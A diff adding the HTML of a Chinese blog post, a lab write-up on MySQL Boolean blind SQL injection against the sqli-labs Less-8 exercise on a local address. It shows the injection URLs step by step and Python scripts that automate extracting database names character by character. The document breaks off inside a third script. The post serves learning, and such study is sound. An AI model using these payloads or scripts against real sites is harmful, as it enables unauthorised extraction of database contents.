@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>MYSQL注入之布尔盲注 | oxxk blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content>
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="学习sql盲注的过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MYSQL注入之布尔盲注">
+<meta property="og:url" content="https://0xxk.github.io/2019/09/08/mysql报错注入/index.html">
+<meta property="og:site_name" content="oxxk blog">
+<meta property="og:description" content="学习sql盲注的过程">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入1.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入2.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入3.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入4.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入5.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入6.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入7.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入8.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入9.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入10.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入11.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入12.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入13.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入14.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入17.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入15.png">
+<meta property="og:image" content="https://0xxk.github.io/images/mysql注入16.png">
+<meta property="og:updated_time" content="2019-09-08T02:51:45.275Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MYSQL注入之布尔盲注">
+<meta name="twitter:description" content="学习sql盲注的过程">
+<meta name="twitter:image" content="https://0xxk.github.io/images/mysql注入1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">0xxk</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/oxxk" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">MYSQL注入之布尔盲注</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+<article id="post-mysql报错注入"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">MYSQL注入之布尔盲注</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-09-08 10:31:15" datetime="2019-09-08T02:31:15.508Z"  itemprop="datePublished">2019-09-08</time>
+
+            <br id="mybreak"/>
+            
+<script>
+	mybreak.style="display:none";
+</script>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">12</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>学习sql盲注的过程</p>
+<a id="more"></a>
+
+<p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> – |<br>首先判断出注入点和注释符号，然后在中间拼接我们的注入语句。按常规流程走，查看字段长度，查看回显位。<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> order by 4 – |<br>错误<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> order by 3 – |<br>正确<br>这时候开始查看回显位<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> union select 1,2,3 – |<br>这时候看到页面回显正常，但是没有回显位。因此判断是盲注，在这里使用<strong>布尔盲注</strong>。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入1.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;and</a> (select count(schema_name) from information_schema.schemata) &gt; 5 – |</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入2.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用二分法找到正确的数值<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;and</a> (select count(schema_name) from information_schema.schemata) &gt; 4 – |</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入3.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>可以看到有5个数据库<br>在这里描述一下我的思路，首先我们要查到有多少数据库。其次要查询每个数据库是多少字符，最后查看每个字符对应的值。<br>在这里已经查询到了有5个数据库，现在查询第一个数据库长度。</p>
+<p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> and length((select schema_name from information_schema.schemata limit 0,1)) &gt;20 – |</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入4.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用二分法逐个查询</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入5.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>可以看到这里第一行一共有18个字符</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入6.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>现在查询第一行数据库18个字符中的第一个字符，</p>
+<p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> and ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt; 100 –<br> |<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入7.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure></p>
+<p>使用二分法进行测试，查看第一个字符是啥。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入8.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在这里可以看到是ascii码为105的字符</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入9.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>105对应着的字符是</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入10.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在查询完第一个之后依次查询对应的数值。<br>手工注入太麻烦了，在这里根据规则写一个自动脚本。<br>以下是针对库名的布尔注入（脚本会在今天的作业中慢慢完善，直到拼接我之前的工具写成属于自己的注入工具）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line">    # print url1</span><br><span class="line">    # print url2</span><br><span class="line">    # return 1</span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def chahangshu():</span><br><span class="line">#</span><br><span class="line"># def changzifushu():</span><br><span class="line">#</span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        list = []</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1)</span><br><span class="line">                    print qingqiuURLm2</span><br><span class="line">                    list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    print qingqiuURL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema = &quot;select schema_name from information_schema.schemata&quot;</span><br><span class="line">    # hangshu = chahangshu()</span><br><span class="line">    # zifushu = changzifushu()</span><br><span class="line">    hangshu = 4</span><br><span class="line">    zifushu = [18,18,18,18]</span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br><span class="line">可以看到5行数据已经爆出来了（后期脚本有改动）</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入11.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>接下来完善布尔查询行数和每行查询字符数的功能（这让手工也忒累了吧！）<br>下面的脚本可以跑出数据库的数量，每个数据库的字符长度和数据库名。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入12.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line">    # print url1</span><br><span class="line">    # print url2</span><br><span class="line">    # return 1</span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    # print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br><span class="line"></span><br><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;个数据库字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line">            # print url3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        list = []</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    # print qingqiuURLm2</span><br><span class="line">                    list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    print qingqiuURL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    # hangshu = 5</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>查库的数据AND查表的数据AND查字段的数据，根本上都是进行了三部，首先查行数，再查每行字符数，最后查每行的单个数据。所以接下来查表名的脚本几乎差不多，只是将核心查询语句改了罢了！代码运行如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入13.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入14.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入17.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入15.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/mysql注入16.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span 